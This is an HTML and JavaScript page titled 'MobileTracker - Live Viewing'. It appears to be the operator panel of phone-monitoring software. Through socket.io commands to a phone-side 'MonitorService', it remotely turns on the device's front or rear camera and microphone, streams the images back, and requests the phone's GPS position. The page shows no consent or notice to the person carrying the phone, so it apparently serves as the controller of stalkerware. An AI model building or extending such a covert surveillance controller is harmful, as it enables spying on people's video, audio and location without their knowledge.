<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>MobileTracker - Live Viewing</title>
    <script src="/socket.io/socket.io.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --blue: #3498db; --red: #d9534f; --teal: #1abc9c; --bg: #f4f7f6; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); margin: 0; padding: 20px; }
        
        .card { background: white; border-radius: 4px; border: 1px solid #ddd; margin-bottom: 20px; }
        .card-header { padding: 12px 20px; border-bottom: 1px solid #eee; color: var(--teal); font-weight: bold; display: flex; align-items: center; }
        .card-header i { margin-right: 10px; }

        /* Media Selection Styles (Matches image_c4a5af.png) */
        .media-selector { display: flex; justify-content: center; gap: 30px; padding: 30px; }
        .mode-box { border: 1px solid #ddd; padding: 20px; width: 90px; text-align: center; border-radius: 4px; cursor: pointer; position: relative; }
        .mode-box.selected { border-color: var(--blue); background: #ebf5fb; }
        .mode-box i { font-size: 2rem; display: block; margin-bottom: 10px; }
        .mode-box .check { position: absolute; top: 5px; right: 5px; color: var(--blue); display: none; }
        .mode-box.selected .check { display: block; }
        
        /* Streaming Display */
        #monitor-screen { width: 100%; max-width: 600px; background: #000; border-radius: 8px; display: none; margin: 0 auto 20px; }

        /* Map Section (Matches image_c4b117.jpg) */
        .map-container { padding: 20px; text-align: center; }
        .pos-info { font-size: 0.85rem; color: #666; margin: 10px 0; }
        #map-frame { width: 100%; height: 400px; background: #eee; border-radius: 4px; border: 1px solid #ccc; }

        /* Controls */
        select { width: 300px; padding: 8px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; }
        .btn-start { background: var(--red); color: white; border: none; padding: 10px 40px; border-radius: 4px; font-weight: bold; cursor: pointer; }
        .btn-stop { background: var(--blue); color: white; border: none; padding: 8px 25px; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="card">
        <div class="card-header"><i class="fa fa-video"></i> LIVE VIEWING</div>
        <div style="padding: 20px;">
            <div class="media-selector">
                <div class="mode-box selected" onclick="setMode('video', this)">
                    <i class="fa fa-video" style="color: #e67e22;"></i>
                    <div class="check"><i class="fa fa-check-circle"></i></div>
                    <span style="font-size: 0.7rem; font-weight: bold; color: #666;">VIDEO</span>
                </div>
                <div class="mode-box" onclick="setMode('audio', this)">
                    <i class="fa fa-microphone" style="color: #9b59b6;"></i>
                    <div class="check"><i class="fa fa-check-circle"></i></div>
                    <span style="font-size: 0.7rem; font-weight: bold; color: #666;">AUDIO</span>
                </div>
                <div class="mode-box">
                    <i class="fa fa-desktop" style="color: var(--red);"></i>
                    <span style="font-size: 0.7rem; font-weight: bold; color: #666;">SCREEN</span>
                </div>
            </div>

            <div style="text-align: center;">
                <select id="cam-sel">
                    <option value="0">Rear camera</option>
                    <option value="1">Front camera</option>
                </select><br>
                <select id="audio-sel">
                    <option value="no">No sound</option>
                    <option value="yes">Capture audio</option>
                </select><br>
                <button class="btn-start" onclick="toggleStream()" id="stream-btn">START STREAM</button>
            </div>
            
            <img id="monitor-screen" src="">
        </div>
    </div>

    <div class="card">
        <div class="card-header"><i class="fa fa-location-dot"></i> LIVE LOCATION</div>
        <div class="map-container">
            <button class="btn-stop" onclick="sendCmd('get-gps')">REFRESH POSITION</button>
            <div class="pos-info">
                <strong>Last known position:</strong><br>
                <span id="pos-text">Waiting for device update...</span>
            </div>
            <div id="map-frame">
                <div style="padding-top: 150px; color: #aaa;">Map Loading...</div>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let isStreaming = false;
        let currentMode = 'video';

        function sendCmd(c) { socket.emit('phone-execute', c); }

        function setMode(mode, el) {
            currentMode = mode;
            document.querySelectorAll('.mode-box').forEach(b => b.classList.remove('selected'));
            el.classList.add('selected');
        }

        function toggleStream() {
            if (!isStreaming) {
                const cam = document.getElementById('cam-sel').value;
                const audio = document.getElementById('audio-sel').value === 'yes' ? 'audio-video' : 'video';
                sendCmd(`stream:${cam}:${audio}`); // Connects to handleCommand in MonitorService
                document.getElementById('monitor-screen').style.display = 'block';
                document.getElementById('stream-btn').innerText = 'STOP STREAM';
                isStreaming = true;
            } else {
                sendCmd('stop-stream'); // Connects to handleCommand in MonitorService
                document.getElementById('monitor-screen').style.display = 'none';
                document.getElementById('stream-btn').innerText = 'START STREAM';
                isStreaming = false;
            }
        }

        // Handle incoming data from MonitorService.java
        socket.on('data-stream', (b64) => {
            document.getElementById('monitor-screen').src = "data:image/jpeg;base64," + b64;
        });

        socket.on('location-update', (data) => {
            document.getElementById('pos-text').innerText = `Lat: ${data.lat}, Lng: ${data.lng} (Updated: ${new Date().toLocaleTimeString()})`;
            // In a real implementation, you would move the map marker here
        });
    </script>
</body>
</html>
